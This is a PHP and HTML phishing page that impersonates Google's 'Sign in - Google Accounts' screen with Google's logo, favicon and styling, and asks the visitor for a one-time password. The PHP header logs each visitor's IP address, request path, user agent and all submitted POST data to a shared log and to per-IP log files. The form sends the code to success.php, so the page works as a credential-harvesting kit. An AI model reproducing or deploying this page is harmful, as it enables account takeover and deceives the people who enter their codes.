<?php

$values = [
  'date' => date('Y-m-d H:i:s'),
  'ip' => $_SERVER['REMOTE_ADDR'],
  'path' => $_SERVER['REQUEST_URI'],
  'user-agent' => $_SERVER['HTTP_USER_AGENT'],
  'extra' => $_POST
];

$ip_name = $_SERVER['REMOTE_ADDR'];

if ($ip_name == "::1") {
  $ip_name = "localhost";
}

file_put_contents('visitors.log', json_encode($values) . PHP_EOL, FILE_APPEND);
file_put_contents(urlencode($ip_name) . '.log', json_encode($values) . PHP_EOL, FILE_APPEND);

?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Sign in - Google Accounts</title>
  <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/favicon_2x.png" />
  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap" rel="stylesheet" />
  <style>
    * {
      box-sizing: border-box;
      font-family: 'Google Sans', Roboto, Arial, sans-serif;
    }

    body {
      background: #f2f2f2;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background: white;
      width: 360px;
      padding: 40px 36px 30px;
      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
      border-radius: 8px;
    }

    .logo {
      width: 75px;
      margin-bottom: 20px;
    }

    h1 {
      font-size: 24px;
      font-weight: 400;
      color: #202124;
      margin-bottom: 8px;
    }

    p.subtitle {
      font-size: 16px;
      color: #5f6368;
      margin-bottom: 24px;
    }

    input[type="tel"] {
      width: 100%;
      padding: 14px;
      font-size: 16px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      margin-bottom: 24px;
    }

    .button {
      width: 100%;
      background-color: #1a73e8;
      color: white;
      padding: 12px;
      font-size: 14px;
      font-weight: 500;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }

    .button:hover {
      background-color: #1765cc;
    }

    .footer {
      font-size: 12px;
      color: #5f6368;
      margin-top: 24px;
      text-align: center;
    }

    .footer a {
      color: #1a73e8;
      text-decoration: none;
    }

    .footer a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google" class="logo" />
    <h1>Sign in</h1>
    <p class="subtitle">to continue to Google</p>

    <form action="success.php" method="POST">
      <label for="code">Enter One Time Password</label><br />
      <input type='' id="code" name="code" placeholder="Enter one time password" required /><br />

      <button type="submit" class="button">Next</button>
    </form>

    <div class="footer">
      <p><a href="#">Forgot phone number?</a></p>
      <p><a href="#">Create account</a></p>
    </div>
  </div>
</body>
</html>
